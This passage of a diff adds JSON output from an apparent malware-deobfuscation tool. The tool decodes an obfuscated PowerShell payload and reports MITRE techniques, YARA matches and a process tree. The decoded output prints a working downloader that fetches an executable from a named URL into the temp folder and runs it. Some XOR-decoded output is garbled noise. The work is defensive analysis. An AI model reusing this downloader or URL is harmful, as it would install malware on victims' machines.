00Q\u0000A\u0000e\u0000Q\u0000B\u0000w\u0000A\u0000G\u0000g\u0000A\u0000a\u0000g\u0000B\u0000j\u0000A\u0000C\u0000A\u0000A\u0000L\u0000Q\u0000B\u0000E\u0000A\u0000G\u0000U\u0000A\u0000c\u0000w\u0000B\u0000U\u0000A\u0000G\u0000k\u0000A\u0000b\u0000g\u0000B\u0000B\u0000A\u0000H\u0000Q\u0000A\u0000S\u0000Q\u0000B\u0000v\u0000A\u0000E\u00004\u0000A\u0000I\u0000A\u0000A\u0000k\u0000A\u0000H\u0000E\u0000A\u0000a\u0000A\u0000B\u0000s\u0000A\u0000D\u0000s\u0000A\u0000I\u0000A\u0000B\u0000J\u0000A\u0000G\u00004\u0000A\u0000d\u0000g\u0000B\u0000v\u0000A\u0000G\u0000s\u0000A\u0000Z\u0000Q\u0000A\u0000t\u0000A\u0000E\u0000k\u0000A\u0000d\u0000A\u0000B\u0000l\u0000A\u0000G\u00000\u0000A\u0000I\u0000A\u0000A\u0000k\u0000A\u0000H\u0000E\u0000A\u0000a\u0000A\u0000B\u0000s\u0000A\u0000D\u0000s\u0000A\u0000f\u0000Q\u0000A\u0000N\u0000A\u0000A\u0000o\u0000A\u0000d\u0000A\u0000B\u0000y\u0000A\u0000H\u0000k\u0000A\u0000e\u0000w\u0000A\u0000g\u0000A\u0000C\u0000A\u0000A\u0000J\u0000A\u0000B\u0000j\u0000A\u0000H\u0000c\u0000A\u0000d\u0000w\u0000B\u0000o\u0000A\u0000G\u0000U\u0000A\u0000Y\u0000g\u0000A\u00009\u0000A\u0000C\u0000Q\u0000A\u0000Z\u0000Q\u0000B\u0000u\u0000A\u0000H\u0000Y\u0000A\u0000O\u0000g\u0000B\u00000\u0000A\u0000G\u0000U\u0000A\u0000b\u0000Q\u0000B\u0000w\u0000A\u0000C\u0000s\u0000A\u0000J\u0000w\u0000B\u0000c\u0000A\u0000H\u0000M\u0000A\u0000Y\u0000w\u0000B\u00003\u0000A\u0000H\u0000g\u0000A\u0000Y\u0000w\u0000A\u0000u\u0000A\u0000G\u0000U\u0000A\u0000e\u0000A\u0000B\u0000l\u0000A\u0000C\u0000c\u0000A\u0000O\u0000w\u0000A\u0000N\u0000A\u0000A\u0000o\u0000A\u0000a\u0000w\u0000B\u0000x\u0000A\u0000G\u00000\u0000A\u0000Z\u0000Q\u0000B\u0000o\u0000A\u0000C\u0000A\u0000A\u0000J\u0000w\u0000B\u0000o\u0000A\u0000H\u0000Q\u0000A\u0000d\u0000A\u0000B\u0000w\u0000A\u0000D\u0000o\u0000A\u0000L\u0000w\u0000A\u0000v\u0000A\u0000G\u0000c\u0000A\u0000Z\u0000Q\u0000B\u0000v\u0000A\u0000H\u0000I\u0000A\u0000Z\u0000w\u0000B\u0000l\u0000A\u0000H\u0000A\u0000A\u0000c\u0000g\u0000B\u0000h\u0000A\u0000H\u0000A\u0000A\u0000Y\u0000Q\u0000B\u0000z\u0000A\u0000C\u00004\u0000A\u0000Y\u0000w\u0000B\u0000v\u0000A\u0000G\u00000\u0000A\u0000L\u0000w\u0000B\u0000j\u0000A\u0000G\u0000U\u0000A\u0000b\u0000Q\u0000A\u0000v\u0000A\u0000F\u0000Y\u0000A\u0000V\u0000g\u0000B\u0000a\u0000A\u0000E\u00000\u0000A\u0000W\u0000Q\u0000B\u0000M\u0000A\u0000E\u0000g\u0000A\u0000Y\u0000Q\u0000B\u0000T\u0000A\u0000E\u00008\u0000A\u0000Y\u0000w\u0000B\u0000i\u0000A\u0000G\u0000w\u0000A\u0000c\u0000Q\u0000B\u0000v\u0000A\u0000C\u00004\u0000A\u0000Z\u0000Q\u0000B\u00004\u0000A\u0000G\u0000U\u0000A\u0000J\u0000w\u0000A\u0000g\u0000A\u0000C\u0000Q\u0000A\u0000Y\u0000w\u0000B\u00003\u0000A\u0000H\u0000c\u0000A\u0000a\u0000A\u0000B\u0000l\u0000A\u0000G\u0000I\u0000A\u0000O\u0000w\u0000A\u0000N\u0000A\u0000A\u0000o\u0000A\u0000I\u0000A\u0000B\u00009\u0000A\u0000G\u0000M\u0000A\u0000Y\u0000Q\u0000B\u00000\u0000A\u0000G\u0000M\u0000A\u0000a\u0000A\u0000B\u00007\u0000A\u0000H\u00000\u0000A\u0000\"\u0000)\u0000)\u0000|\u0000I\u0000e\u0000X\u0000",
+        "score_breakdown": {
+          "score": 0.7,
+          "printable": 0.5,
+          "english": 0.0,
+          "entropy": 3.264,
+          "size": 1786,
+          "reasons": [
+            "json-shape",
+            "utf16-embedded"
+          ]
+        },
+        "path_scores": [
+          0.45,
+          0.7
+        ],
+        "entropy": 3.264,
+        "is_shellcode": false
+      },
+      {
+        "chain": [
+          {
+            "op": "extract-payload",
+            "args": {}
+          },
+          {
+            "op": "base64-decode",
+            "args": {}
+          },
+          {
+            "op": "xor-brute",
+            "args": {
+              "key_len": "auto"
+            }
+          }
+        ],
+        "output": "{ S y s T E M \u000e t E x t \u000e e n C O d i n G } \u001a \u001a U N i c O d e \u000e G E T S T R i N g \b { S Y S T E M \u000e c o n V E r T } \u001a \u001a F r o m b A S E \u0016 \u0014 S t R I n g \b \u0002 D a b Y a h K a E W b M a g \u0018 a C G a G a c G a j a b P a d \u0010 a m q a \u0017 a c a a j a b P a c a a l q b S a g u a i a a X a d m a m a a W a d a a o W a G a c q a A q a R a c S a k q a G a h S a j a b P a c W a i G b G a g \u0014 a i G b \u0019 a h \u0010 a y W b H a h q a y W b O a h S a F q a G a g y a D q b U a g m a D a b P a g \u0018 a B G a G a g S a C q b T a g u a A a a G a c G a i a a K a h K a C a b O a g O a y W a G a c W a i a a K a h e a A a b S a c a a k q a G a h S a A q b n a h a a B W b s a h q a l q b n a e \u0018 a z a b v a e W a r q a G a g i a A q b u a f m a v a b Y a e e a t G b Z a e y a r q b Y a d S a d q a k a f m a D a b b a f i a v a a T a e i a A q b u a h m a v a b s a g e a B G b t a g y a r q b Y a c a a l q b Z a g \u0018 a D q b Y a e m a z q a G a c q a E q b W a g G a A G b J a c a a l q b e a g u a C W b u a g K a B G b b a h q a s q b V a e \u0014 a i a a K a h e a A a b S a d S a i a b j a g \u0014 a D G b V a g S a z q a T a e K a D a b L a g \u0010 a i a a K a h e a A a b S a d S a F q a n a a O a D a b Y a h K a E W a G a c a a j a b J a h C a D W b O a g u a y G a \u0019 a c q a z q b U a h y a o G b \u0010 a g u a B q b W a c S a j W b C a h m a y W b \u0013 a h G a y W a U a g u a E a b L a c C a o W a n a a O a A W b X a g \u0010 a z q b O a c a a j W b O a h q a D a b W a d O a l W a V a g C a z q b V a h i a z W b L a h a a C G b H a h a a y q b Z a c \u0014 a y W b V a g \u0010 a l W b J a g u a B q a V a f y a v G b A a e \u0010 a w q b m a e G a y q b t a e \u0018 a y W b I a g W a C q b V a c \u0014 a z q b \u0014 a g u a j W a G a c q a y W b \u0013 a h C a A a b L a g i a o W a n a a O a i a b \u0019 a g m a y q b \u0010 a g m a A a b \u0017 a h \u0010 a \u0002 \t \t \\ i E x ",
+        "score_breakdown": {
+          "score": 0.6431,
+          "printable": 0.977,
+          "english": 0.0,
+          "entropy": 3.264,
+          "size": 1786,
+          "reasons": [
+            "printable=0.98",
+            "json-shape"
+          ]
+        },
+        "path_scores": [
+          0.45,
+          0.7,
+          0.6431
+        ],
+        "entropy": 3.264,
+        "is_shellcode": false
+      }
+    ],
+    "corrupted_container": null
+  },
+  "ai_decode": {
+    "reasoning": "The payload contains three layers of obfuscation: 1) CMD caret obfuscation in 'powershell' command, 2) Base64-encoded UTF-16LE PowerShell code with -e flag, 3) Additional PowerShell with XOR-encoded integer array. Need to decode base64, then extract and XOR decode the array with key 0x36.",
+    "recipe": [
+      {
+        "op": "extract-payload",
+        "args": {}
+      },
+      {
+        "op": "base64-decode",
+        "args": {}
+      },
+      {
+        "op": "utf16le-decode",
+        "args": {}
+      },
+      {
+        "op": "extract-payload",
+        "args": {}
+      },
+      {
+        "op": "base64-decode",
+        "args": {}
+      },
+      {
+        "op": "utf16le-decode",
+        "args": {}
+      }
+    ],
+    "output": "try{for ($i=1; $i -le 13000; $i++) {$i,\"`n\"}}catch{} function kqmeh ( $yphjc , $qhl ) {iMpoRt-MOdULE biTSTrANsFEr;\r\nStART-BiTsTRanSfEr -sourCe $yphjc -DesTinAtIoN $qhl; Invoke-Item $qhl;}\r\ntry{  $cwwheb=$env:temp+'\\scwxc.exe';\r\nkqmeh 'http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe' $cwwheb;\r\n }catch{}",
+    "steps_output": [
+      {
+        "op": "extract-payload",
+        "args": {}
+      },
+      {
+        "op": "base64-decode",
+        "args": {}
+      },
+      {
+        "op": "utf16le-decode",
+        "args": {}
+      },
+      {
+        "op": "extract-payload",
+        "args": {}
+      },
+      {
+        "op": "base64-decode",
+        "args": {}
+      },
+      {
+        "op": "utf16le-decode",
+        "args": {}
+      }
+    ],
+    "detected_type": null,
+    "errors": [],
+    "winner_engine": "magic",
+    "confidence": 70,
+    "quality_reasons": [
+      "2 IOC(s) recovered",
+      "script markers: ['http://', '$env:']",
+      "clean printable (+0.10)"
+    ],
+    "stopped_gracefully": false,
+    "graceful_message": "",
+    "alternate": {
+      "engine": "ai",
+      "confidence": 0,
+      "recipe": [
+        {
+          "op": "strip-carets",
+          "args": {}
+        },
+        {
+          "op": "powershell-encoded",
+          "args": {}
+        },
+        {
+          "op": "utf16le-decode",
+          "args": {}
+        },
+        {
+          "op": "base64-decode",
+          "args": {}
+        },
+        {
+          "op": "utf16le-decode",
+          "args": {}
+        },
+        {
+          "op": "extract-int-array",
+          "args": {}
+        },
+        {
+          "op": "xor",
+          "args": {
+            "key": "0x36"
+          }
+        },
+        {
+          "op": "powershell-deobfuscate",
+          "args": {}
+        }
+      ]
+    },
+    "cache_hit": true
+  },
+  "analyze": {
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1059.001",
+        "technique": "PowerShell (hidden)",
+        "tactic": "Execution",
+        "source": "heuristic"
+      },
+      {
+        "id": "T1027.010",
+        "technique": "PowerShell -EncodedCommand fragment \u2014 long base64 payload",
+        "tactic": "Defense Evasion",
+        "source": "heuristic"
+      },
+      {
+        "id": "T1027",
+        "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+        "tactic": "Defense Evasion",
+        "source": "heuristic"
+      }
+    ],
+    "yara": [
+      {
+        "rule": "IEX_Invocation",
+        "severity": "high",
+        "match": "IEX",
+        "description": "In-memory execution via IEX"
+      },
+      {
+        "rule": "CMD_Obfuscation_Caret",
+        "severity": "medium",
+        "match": "^o",
+        "description": "CMD.exe caret-based obfuscation"
+      },
+      {
+        "rule": "Base64_Long_Blob",
+        "severity": "low",
+        "match": "WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBzAHkA",
+        "description": "Long Base64 blob"
+      },
+      {
+        "rule": "PS_CaseMixed_Obfuscation",
+        "severity": "low",
+        "match": "ForegroundColor",
+        "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "cmd.exe",
+        "purposes": [
+          "Execute"
+        ],
+        "mitre": [
+          "T1059.003"
+        ],
+        "description": "cmd.exe with /c chain or caret-obfuscation",
+        "snippet": "ion LOLBIN cmd.exe Behavior 1. Executes downloaded content in-memory with IEX (no disk write) Per-layer decoded outputs available in the Cha",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+        "source": "curated"
+      }
+    ],
+    "risk": {
+      "score": 60,
+      "verdict": "Suspicious",
+      "level": "medium"
+    },
+    "osint": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "hashes": [],
+      "sources_used": [
+        "ip-api.com (geolocation, no key)",
+        "system DNS (reverse lookup, resolution)",
+        "AbuseIPDB",
+        "URLScan.io",
+        "AlienVault OTX",
+        "Hybrid Analysis"
+      ]
+    },
+    "ti_hits": [],
+    "ai_verdict": {
+      "error": "AI timed out (>55s) \u2014 narrative skipped"
+    },
+    "description": {
+      "error": "AI timed out (>55s) \u2014 narrative skipped"
+    },
+    "corrupt_payload": null
+  },
+  "predict_tree": {
+    "tree": {
+      "tree_id": "5b1ed79e46",
+      "platform": "windows",
+      "root": {
+        "node_id": "0ca42ea110",
+        "parent_node_id": null,
+        "process": "cmd.exe",
+        "command_line": null,
+        "executable_path": null,
+        "hashes": {},
+        "signer": null,
+        "pid": null,
+        "ppid": null,
+        "user": null,
+        "integrity_level": null,
+        "action": "Deterministic tree \u2014 LLM unavailable, tree built from LOLBIN + IOC + MITRE evidence.",
+        "lolbin": false,
+        "mitre_ids": [],
+        "tactic": null,
+        "ts_delta_ms": 0,
+        "timestamp": null,
+        "evidence": {
+          "citation": "cmd.exe",
+          "layer_index": null,
+          "inferred": true,
+          "confidence": 0.35
+        },
+        "children": []
+      },
+      "rationale": {
+        "verdict": "Suspicious",
+        "severity": "medium",
+        "confidence": 0.0,
+        "iocs": {},
+        "lolbins": [],
+        "mitre_ids": [
+          "T1059.001",
+          "T1027.010",
+          "T1027"
+        ],
+        "tactics": [],
+        "sigma_opportunities": [],
+        "yara_opportunities": [],
+        "evidence_refs": [],
+        "analyst_summary": ""
+      },
+      "evidence_source": "heuristic-fallback",
+      "warnings": [
+        "LLM unavailable \u2014 used deterministic evidence only (LLM timed out (>40s) \u2014 heuristic tree emitted)"
+      ],
+      "generated_ts": "2026-07-19T00:56:30.606098+00:00"
+    },
+    "edge_list": {
+      "tree_id": "5b1ed79e46",
+      "platform": "windows",
+      "evidence_source": "heuristic-fallback",
+      "nodes": [
+        {
+          "node_id": "0ca42ea110",
+          "parent_node_id": null,
+          "process": "cmd.exe",
+          "command_line": null,
+          "executable_path": null,
+          "hashes": {},
+          "signer": null,
+          "pid": null,
+          "ppid": null,
+          "user": null,
+          "integrity_level": null,
+          "action": "Deterministic tree \u2014 LLM unavailable, tree built from LOLBIN + IOC + MITRE evidence.",
+          "lolbin": false,
+          "mitre_ids": [],
+          "tactic": null,
+          "ts_delta_ms": 0,
+          "timestamp": null,
+          "evidence": {
+            "citation": "cmd.exe",
+            "layer_index": null,
+            "inferred": true,
+            "confidence": 0.35
+          }
+        }
+      ],
+      "edges": [],
+      "rationale": {
+        "verdict": "Suspicious",
+        "severity": "medium",
+        "confidence": 0.0,
+        "iocs": {},
+        "lolbins": [],
+        "mitre_ids": [
+          "T1059.001",
+          "T1027.010",
+          "T1027"
+        ],
+        "tactics": [],
+        "sigma_opportunities": [],
+        "yara_opportunities": [],
+        "evidence_refs": [],
+        "analyst_summary": ""
+      },
+      "warnings": [
+        "LLM unavailable \u2014 used deterministic evidence only (LLM timed out (>40s) \u2014 heuristic tree emitted)"
+      ]
+    },
+    "ascii": "[WINDOWS] tree_id=5b1ed79e46 \u00b7 source=heuristic-fallback\nverdict : Suspicious  (medium)\nMITRE   : T1059.001, T1027.010, T1027\n\n\u2514\u2500 cmd.exe  (inferred)\n     \u2192 Deterministic tree \u2014 LLM unavailable, tree built from LOLBIN + IOC + MITRE evidence."
+  }
+}
